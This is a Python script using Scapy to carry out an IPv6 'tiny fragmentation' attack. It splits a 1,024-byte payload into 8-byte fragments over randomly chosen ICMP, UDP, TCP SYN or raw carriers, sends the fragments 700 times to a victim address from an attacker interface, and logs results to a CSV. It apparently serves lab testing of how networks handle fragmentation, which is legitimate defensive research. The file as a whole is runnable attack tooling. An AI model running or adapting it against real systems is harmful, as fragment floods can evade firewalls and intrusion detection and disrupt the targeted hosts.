# BASIC TINY FRAGMENTATION
from scapy.all import IPv6, IPv6ExtHdrFragment, ICMPv6EchoRequest, UDP, TCP, Raw, send
import csv
import time
import os
import random

# === CONFIGURATION ===
TARGET_IP = "2001:db8::2"   # Victim IPv6 address
INTERFACE = "eth3"          # Attacker's Interface
ATTACK_TYPE = "Tiny Fragmentation"
PAYLOAD = b"A" * 1024       # Payload size
CSV_FILE = "attack_results.csv"

# === ATTACK FUNCTION ===
def simulate_tiny_fragmentation():
    protocols = ["icmp", "udp", "tcp", "raw"]
    chosen_proto = random.choice(protocols)

    fragment_size = 8
    fragments = []
    identification = random.randint(1, 65535)
    payload = PAYLOAD

    for i in range(0, len(payload), fragment_size):
        fragment_payload = payload[i:i+fragment_size]
        offset = i // 8
        more_fragments = 1 if (i + fragment_size) < len(payload) else 0

        frag_hdr = IPv6ExtHdrFragment(id=identification, offset=offset, m=more_fragments)

        if chosen_proto == "icmp":
            upper = ICMPv6EchoRequest(data=fragment_payload)
        elif chosen_proto == "udp":
            upper = UDP(sport=1234, dport=5678)/Raw(load=fragment_payload)
        elif chosen_proto == "tcp":
            upper = TCP(sport=1234, dport=80, flags="S")/Raw(load=fragment_payload)
        else:  # raw
            upper = Raw(load=fragment_payload)

        frag_pkt = IPv6(dst=TARGET_IP)/frag_hdr/upper
        fragments.append(frag_pkt)

    start_time = time.time()
    for frag in fragments:
        send(frag, iface=INTERFACE, verbose=0)
    end_time = time.time()

    print(f"[+] Sent {len(fragments)} fragments using {chosen_proto.upper()} protocol.")
    return len(fragments), len(payload), round(end_time - start_time, 4), chosen_proto

def log_results(attack_type, frag_count, payload_size, time_taken, protocol, response="N/A", error="N/A"):
    file_exists = os.path.isfile(CSV_FILE)
    try:
        with open(CSV_FILE, mode='a', newline='') as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Attack Type", "Protocol", "Fragment Count", "Payload Size", "Reassembly Time (s)", "Target Response", "Errors"])
            writer.writerow([attack_type, protocol, frag_count, payload_size, time_taken, response, error])
    except Exception as write_error:
        print("[-] Failed to write to CSV:", write_error)

if __name__ == '__main__':
    for packets in [700]: # Number of Looping
        print(f"\n[*] Sending {packets} packets...")
        start_time = time.time()
        try:
            for _ in range(packets):
                frag_count, payload_size, time_taken, proto = simulate_tiny_fragmentation()
                log_results(f"{ATTACK_TYPE} ({packets})", frag_count, payload_size, time_taken, proto)
                time.sleep(0.005) 
        except Exception as e:
            log_results(f"{ATTACK_TYPE} ({packets})", 0, 0, 0, "N/A", error=str(e))
        end_time = time.time()
        print(f"[+] Done sending {packets} packets. Total time: {round(end_time - start_time, 2)} seconds.")

